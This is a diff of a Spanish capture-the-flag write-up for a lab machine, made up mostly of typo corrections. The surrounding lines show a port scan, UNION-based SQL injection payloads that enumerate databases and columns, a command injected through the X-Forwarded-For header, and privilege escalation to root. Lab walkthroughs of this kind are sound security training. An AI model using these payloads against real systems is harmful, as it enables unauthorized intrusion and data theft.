@@ -26,7 +26,7 @@ nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.233 -oG allPorts
 
 # Enumeración puerto 80
 
-Viendo la página en el puerto 80, tenemos que podemos verificar `players` para si son elegibles para participar en algún torneo
+Viendo la página en el puerto 80, tenemos que podemos verificar `players` para ver si son elegibles para participar en algún torneo
 
 <img src="/images/Pasted image 20251226152243.png" style="width:100%; height:auto; display:block; margin:auto;">
 
@@ -40,7 +40,7 @@ Yendo a `challenge.php` encontramos algo similar a la página anterior, solo que
 
 # SQLinjection
 
-Interceptando la petición de la página principal en `burpsuite`, probamos inyecciones sql básicas, teniendo éxito en la `Union injection` Con el siguiente payload
+Interceptando la petición de la página principal en `burpsuite`, probamos inyecciones sql básicas, teniendo éxito en la `Union injection` con el siguiente payload
 
 ```bash
 celero0' UNION SELECT 1;--+-
@@ -52,7 +52,7 @@ celero0' UNION SELECT 1;--+-
 
 Podemos ver que solo tiene una columna la consulta, por lo tanto procederemos a investigar por las bases de datos
 
-```
+```bash
 celero0' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;-- -
 ```
 
@@ -78,7 +78,7 @@ Para ver el nombre de la columna de la tabla `flag` tenemos el siguiente payload
 celero0' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag';-- -
 ```
 
-Mostrando que existe sólo una columna llamada `one`
+Mostrando que existe solo una columna llamada `one`
 
 <img src="/images/Pasted image 20251226155306.png" style="width:100%; height:auto; display:block; margin:auto;">
 
@@ -169,7 +169,7 @@ X-FORWARDED-FOR: 10.10.10.10;ping 10.10.14.20;
 
 <img src="/images/Pasted image 20251226175349.png" style="width:100%; height:auto; display:block; margin:auto;">
 
-y verificamos las trazas `ICMP` con `TCPDUMP` de la siguiente forma
+y verificamos las trazas `ICMP` con `tcpdump` de la siguiente forma
 
 ```bash
 tcpdump -i tun0 icmp
@@ -205,3 +205,4 @@ Por tanto nos convertiremos en el usuario `root` con el comando `sudo su` y proc
 
 <img src="/images/Pasted image 20251226175751.png" style="width:100%; height:auto; display:block; margin:auto;">
 
+Comprometiendo totalmente el sistema.
